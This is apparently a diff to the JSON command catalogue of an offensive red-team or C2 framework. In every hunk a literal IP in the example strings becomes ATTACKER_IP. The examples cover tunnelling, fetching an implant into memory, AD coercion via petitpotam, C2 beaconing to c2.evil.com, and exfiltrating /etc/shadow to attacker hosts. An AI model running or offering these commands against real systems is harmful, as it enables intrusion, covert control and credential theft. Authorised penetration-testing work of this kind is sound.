@@ -431,7 +431,7 @@
       "args": [
         {"name": "server_ip", "type": "string", "required": true, "description": "IP address of the ICMP tunnel server (attacker)"}
       ],
-      "examples": ["icmp_tunnel 10.13.5.162"],
+      "examples": ["icmp_tunnel ATTACKER_IP"],
       "agents": ["python", "csharp", "go"]
     },
     "ws_tunnel": {
@@ -442,7 +442,7 @@
         {"name": "ws_url", "type": "string", "required": true, "description": "WebSocket server URL (e.g. ws://attacker:8080/ws)"},
         {"name": "local_port", "type": "integer", "required": false, "description": "Local port to bind the tunnel endpoint (default: 1080)"}
       ],
-      "examples": ["ws_tunnel ws://10.13.5.162:8080/ws", "ws_tunnel wss://c2.evil.com/tunnel 9050"],
+      "examples": ["ws_tunnel ws://ATTACKER_IP:8080/ws", "ws_tunnel wss://c2.evil.com/tunnel 9050"],
       "agents": ["python", "csharp", "go"]
     },
     "pipe_tunnel": {
@@ -603,7 +603,7 @@
       "args": [
         {"name": "payload_url", "type": "string", "required": true, "description": "URL to fetch the payload from (fetched into memory, never written to disk)"}
       ],
-      "examples": ["memory_only http://10.13.5.162:8888/implant.elf"],
+      "examples": ["memory_only http://ATTACKER_IP:8888/implant.elf"],
       "agents": ["php", "python", "csharp", "go", "powershell"]
     },
 
@@ -882,7 +882,7 @@
         {"name": "listener", "type": "string", "required": true, "description": "Listener IP to capture the authentication"},
         {"name": "method", "type": "string", "required": false, "description": "Coercion method: 'petitpotam', 'printerbug', 'dfscoerce', 'shadowcoerce' (default: try all)"}
       ],
-      "examples": ["ad_coerce dc01 10.13.5.162", "ad_coerce dc01 10.13.5.162 petitpotam"],
+      "examples": ["ad_coerce dc01 ATTACKER_IP", "ad_coerce dc01 ATTACKER_IP petitpotam"],
       "agents": ["python", "csharp", "go", "powershell"]
     },
     "ad_ntlm_relay": {
@@ -933,7 +933,7 @@
         {"name": "interval", "type": "integer", "required": false, "description": "Beacon interval in seconds (default: 30)"},
         {"name": "jitter", "type": "integer", "required": false, "description": "Jitter percentage 0-100 (default: 20)"}
       ],
-      "examples": ["c2_http http://10.13.5.162:8080/api", "c2_http https://c2.evil.com/beacon 60 30"],
+      "examples": ["c2_http http://ATTACKER_IP:8080/api", "c2_http https://c2.evil.com/beacon 60 30"],
       "agents": ["php", "python", "csharp", "go", "powershell"]
     },
     "c2_discord": {
@@ -966,7 +966,7 @@
         {"name": "server", "type": "string", "required": true, "description": "C2 server address (host:port or URL)"},
         {"name": "interval", "type": "integer", "required": false, "description": "Check-in interval in seconds (default: 60)"}
       ],
-      "examples": ["c2_beacon 10.13.5.162:4443", "c2_beacon https://c2.evil.com 120"],
+      "examples": ["c2_beacon ATTACKER_IP:4443", "c2_beacon https://c2.evil.com 120"],
       "agents": ["php", "python", "csharp", "go", "powershell"]
     },
     "c2_dns": {
@@ -991,7 +991,7 @@
         {"name": "method", "type": "string", "required": false, "description": "Exfil method: 'http', 'dns', 'icmp', 'smb', 'scp' (default: http)"},
         {"name": "destination", "type": "string", "required": false, "description": "Destination URL, host, or path depending on method"}
       ],
-      "examples": ["exfil /tmp/loot.tar.gz", "exfil /etc/shadow http http://10.13.5.162:8080/upload", "exfil /tmp/data dns t.evil.com"],
+      "examples": ["exfil /tmp/loot.tar.gz", "exfil /etc/shadow http http://ATTACKER_IP:8080/upload", "exfil /tmp/data dns t.evil.com"],
       "agents": ["php", "python", "csharp", "go", "powershell"]
     },
     "compress": {
